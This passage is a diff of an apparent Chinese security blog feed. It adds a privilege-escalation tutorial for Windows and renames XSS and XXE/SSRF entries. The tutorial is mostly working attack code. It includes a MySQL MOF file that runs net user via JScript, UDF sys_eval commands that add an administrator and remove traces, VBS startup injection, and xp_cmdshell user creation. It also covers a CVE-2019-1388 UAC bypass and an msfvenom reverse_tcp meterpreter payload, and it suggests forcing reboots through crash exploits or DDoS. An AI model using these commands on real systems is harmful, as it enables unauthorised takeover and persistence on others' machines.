+<p>方法一：在cmd中输入systeminfo查看补丁安装情况</p>
+<p>​​</p>
+<p>方法二：通过命令查询出哪些补丁没有安装</p>
+</li>
+<li>
+<p>查找补丁对应的漏洞号 使用在线查询工具</p>
+<p><a href="http://blog.neargle.com/win-powerup-exp-index/#" target="_blank" rel="noopener noreferrer">http://blog.neargle.com/win-powerup-exp-index/#</a></p>
+<p><a href="http://tools.sbbbb.cn/tiquan/" target="_blank" rel="noopener noreferrer">http://tools.sbbbb.cn/tiquan/</a></p>
+<p><a href="http://bypass.tidesec.com/exp/" target="_blank" rel="noopener noreferrer">http://bypass.tidesec.com/exp/</a></p>
+</li>
+<li>
+<p>查找对应提权exp</p>
+<p>可在搜索引擎查找</p>
+<p>github查找  <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener noreferrer">github.com/SecWiki/windows-kernel-exploits</a></p>
+<p>windows中提权exp的格式为</p>
+<p>​​</p>
+</li>
+<li>
+<p>配合msf进行提权</p>
+</li>
+</ol>
+<h4>2.windows 数据库提权</h4>
+<h5>mysql-mof提权步骤</h5>
+<ol>
+<li>
+<p>在可写目录中上传mof文件</p>
+<p>nullevt.mof   文件</p>
+<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#pragma namespace("\\\\.\\root\\subscription")</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> __EventFilter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $EventFilter</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">EventNamespace</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Root</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Cimv2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "filtP2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Query</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Select * From __InstanceModificationEvent "</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"Where TargetInstance Isa </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Win32_LocalTime</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> "</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"And TargetInstance.Second = 5"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">QueryLanguage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "WQL"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ActiveScriptEventConsumer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $Consumer</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "consPCSV2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ScriptingEngine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "JScript"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ScriptText</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"var WSH = new ActiveXObject(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WScript.Shell</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">)\nWSH.run(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.exe user zhang 123456 /add</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">)"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> __FilterToConsumerBinding</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Consumer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $Consumer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $EventFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>把.mof脚本移动到指定的目录：c:/windows/system32/wbem/mof/目录下，该目录每5秒执行一次​</p>
+</li>
+<li>
+<p>执行 load file 及 into dumpfile 把文件导出到正确的位置</p>
+<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> load_file('c:/phpstudy/www/nullevt.mof')into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> dumpfile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'c:/windows/system32/wbem/mof/nullevt.mof'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
+<li>
+<p>执行成功后，验证mof文件中的cmd命令是否执行</p>
+<p>​​</p>
+</li>
+<li>
+<p>同样的方法修改mof文件再重复上次的步骤，可以将用户添加到管理员组</p>
+</li>
+</ol>
+<p>‍</p>
+<h5>mysql-UDF提权</h5>
+<h6>UDF提权原理</h6>
+<p><span data-type="text" style="color: var(--b3-font-color8);">UDF(User Defined Function)用户自定义函数,支持用户自定义</span></p>
+<p>通过添加新的函数，<span data-type="text" style="color: var(--b3-font-color8);">对mysqI服务器进行功能扩充，从而创建函数，将MYSQL账号转化为系统system权限</span></p>
+<p>UDF提权是通过root权限导出udf.dll到系统目录下，可以<span data-type="text" style="color: var(--b3-font-color8);">通过udf.dll调用执行cmd</span></p>
+<h6>利用UDF提权条件</h6>
+<ol>
+<li>
+<p>Windows 2000、XP、2003</p>
+</li>
+<li>
+<ol start="2">
+<li>MySQL数据库版本</li>
+</ol>
+</li>
+<li>
+<p>3.账号具有对MySQL的插入和删除权限</p>
+</li>
+<li>
+<p>4.可以将udf.d写入到相应目录的权限</p>
+<p>​​</p>
+</li>
+</ol>
+<h6>MySQL-UDF提权步骤</h6>
+<ol>
+<li>
+<p>收集必要信息</p>
+<p>select version();   select user();    select @@basedir,    //获取数据库版本 //获取数据库用户 //获取数据库安装目录</p>
+</li>
+</ol>
+<p>​​</p>
+<ol start="2">
+<li>
+<p>MySQL版本高于5.1，创建导出文件夹</p>
+<p>/lib/plugin目录本身是不存在的，可以利用NTFS ADS流来创建文件夹</p>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'xxx'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> dumpfile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'MySQL目录\\lib::$INDEX ALLOCATION'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'xxx'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> dumpfile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'MySQL目录\\lib\\plugin::$INDEX ALLOCATION'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>也可以利用webshell直接在mysql安装路径下创建piugin目录</p>
+</li>
+<li>
+<p>导入 udf.dl 文件</p>
+<p>DLL文件的获取方法:</p>
+<p>在 sqlmap/data/udf/mysq!/ 目录下,</p>
+<p>在Windows目录中有32位和64位dll文件(MySQL的位数，文件夹中的dll文件是通过异或编码的，可以使用sqlmap/extra/cloak.py进行解密</p>
+<p>将dll文件上传到mysql的/Iib/plugin目录下</p>
+<p>​​</p>
+</li>
+<li>
+<p>创建自定义函数</p>
+<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> function</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sys_eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> returns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> soname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'udf.dll'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#创建自定义函数  需要创建.dll文件中存在的函数才可以</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> sys_eval("net</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> user youze1 123456 /add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">");   #创建用户</span></span>
+<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">select sys_eval("</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">net localgroup administrators youze1 /add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"); #提升为管理员权限</span></span>
+<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">drop function sys_eval;  #清除痕迹</span></span>
+<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">delete from mysql.func where name="</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sys_eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">";</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+</ol>
+<p>​​</p>
+<h5>mysql启动项提权</h5>
+<h6>原理</h6>
+<p>将一段 VBS脚本导入到<span data-type="text" style="color: var(--b3-font-color8);">开机启动项中</span>，如果管理员重启了服务器，那么就会自动调用该脚本，并执行其中的用户添加 及提权命令</p>
+<h6>利用条件:</h6>
+<ol>
+<li>
+<p>上传到目录必须具备可读写的权限</p>
+</li>
+<li>
+<p>调用的 cmd 也必须有足够的权限</p>
+</li>
+<li>
+<p>重启服务器可以利用一些可导致服务器蓝屏的EXP，或者DDoS拒绝服务</p>
+</li>
+</ol>
+<h6>步骤</h6>
+<ol>
+<li>
+<p>如果可以直接上传到启动项目录就不需要使用数据库</p>
+<p>C:\Documents and Settings\All Users\「开始」菜单\程序\启动 目录存在可读写的权限</p>
+</li>
+<li>
+<p>进入test数据库，并创建一个新的表:</p>
+<p>create table a(cmd text)  // a表名，字段名cmd，text文本类型</p>
+</li>
+<li>
+<p>在表中插入数据</p>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"set wshshell=createobject(""wscript.shell"")"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">); </span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"a=wshshell.run(""cmd.exe /c net user icg 123.com /add"" 0)"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">); </span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"b=wshshell.run(""cmd.exe /c net localgroup administrators icg /add"",0)"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>输出表为一个 VBS 的脚本文件</p>
+<p>select * from a into dumpfile "C:\Documents and Settings\Administrator\「开始」菜单\程序启动\1.vbs"</p>
+</li>
+<li>
+<p>利用其他手段重启电脑</p>
+</li>
+</ol>
+<h5>MSSQL xp_cmdshell提权</h5>
+<ol>
+<li>
+<p>连接数据库之后</p>
+</li>
+<li>
+<p>查看相干信息</p>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--查看当前版本:</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> @@</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
+<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--判断当前是否为sa:</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'sysadmin'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span></span>
+<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--判断是否有public权限，可以爆破表:</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'public'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span></span>
+<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--判断当前用户写文件、读文件的权限:</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'db_owner'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>查看数据库中是否有 xp_cmdshell 扩展存储插件,返回值为 1则说明该数据库中有插件     MSSQL使用xp_cmdshell</p>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> count</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(*) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.sysobjects </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">where</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xtype</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'x'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">and</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'xp cmdshell'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
+<li>
+<p>开启xp_cmdshell   MSSQL使用xp_cmdshell</p>
+</li>
+<li>
+<p>执行命令创建用户</p>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">xp_cmdshell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'net user youze 123456 /add'</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">       -- 添加用户ichungiu,密码123.com </span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">xp_cmdshell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' net localgroup administrators youze /add'</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">       -- 添加ichunqiu到管理员组</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
+</ol>
+<h2>3.windows bypass UAC提权</h2>
+<h5>利用CVE-2019-1388实现bypass UAC</h5>
+<p>原理:</p>
+<p>如果在运行一个可执行文件的时候我们<span data-type="text" style="color: var(--b3-font-color8);">触发了 UAC</span>,在点击「展示证书发行者的详细信息」这个链接之后 可以看到证书里的 Issued by 字段,这个字段对应的值就是 OID。证书会解析 OID 的值,可能显示为超链接，但是 Windows 忘记禁用了 OID 处的超链接，这就给了我们提权的可能</p>
+<p>步骤</p>
+<ol>
+<li>
+<p>查看是否打补丁  systeminfo</p>
+</li>
+<li>
+<p>下载EXP:CVE-2019-1388/HHUPD.EXE  这里是开启http服务上传​</p>
+<p>​</p>
+</li>
+<li>
+<p>将exp下载到目标机中，并以管理员权限打开HHUPD.EXE,点击显示详细信息​</p>
+<p>​</p>
+</li>
+<li>
+<p>点击显示详细信息里的   "显示有关此发布者的证书的信息“</p>
+</li>
+<li>
+<p>将弹出的网页"另存为”，弹出位置不可用窗口后点击确定</p>
+</li>
+<li>
+<p>通过在保存网页的文件资源管理器的地址栏输入“C:\windows\system32\cmd.exe”打开cmd  这样才能继承浏览器的SYSTEM权限​</p>
+<p>​</p>
+</li>
+</ol>
+<h5>利用MSF的 bypassuac 模块</h5>
+<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">msfvenom</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> windows/meterpreter/reverse_tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lhost=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">192.168.61.20</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lport=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">6666</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tests.exe</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #lhostiplport</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>通过一系列的前期渗透测试，已经获得了目标机器的meterpreter shell,当前权限为普通用户权限，可以尝试获取系统的System权限。</p>
+<p>​​</p>
+<h2>4.windows错误系统配置提权</h2>
+<p>...</p>
+<p>‍</p>
+]]></content>
+    <category term="渗透测试"/>
+    <published>2024-09-23T00:00:00.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">XSS-lab靶场闯关详解</title>
+    <id>https://min168.top/perm/XSS-lab%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%E8%AF%A6%E8%A7%A3.html</id>
+    <link href="https://min168.top/perm/XSS-lab%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%E8%AF%A6%E8%A7%A3.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <h2>level1</h2>
 <p>payload：</p>
@@ -14201,10 +14611,10 @@ exp下载链接：<a href="https://github.com/SecWiki/linux-kernel-exploits" tit
     <published>2023-02-15T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">XSS实验</title>
-    <id>https://min168.top/perm/XSS%E5%AE%9E%E9%AA%8C.html</id>
-    <link href="https://min168.top/perm/XSS%E5%AE%9E%E9%AA%8C.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">XSS跨站脚本攻击实验手册</title>
+    <id>https://min168.top/perm/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C%E6%89%8B%E5%86%8C.html</id>
+    <link href="https://min168.top/perm/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C%E6%89%8B%E5%86%8C.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <h2>通过存储型XSS获取被攻击者的cookie</h2>
 <ol>
@@ -14448,10 +14858,10 @@ exp下载链接：<a href="https://github.com/SecWiki/linux-kernel-exploits" tit
     <published>2023-02-10T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">XXE&amp;SSRF</title>
-    <id>https://min168.top/perm/XXE_SSRF.html</id>
-    <link href="https://min168.top/perm/XXE_SSRF.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">XXE与SSRF漏洞原理及利用实战</title>
+    <id>https://min168.top/perm/XXE%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98.html</id>
+    <link href="https://min168.top/perm/XXE%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <h2>XXE</h2>
 <h3>漏洞复现</h3>
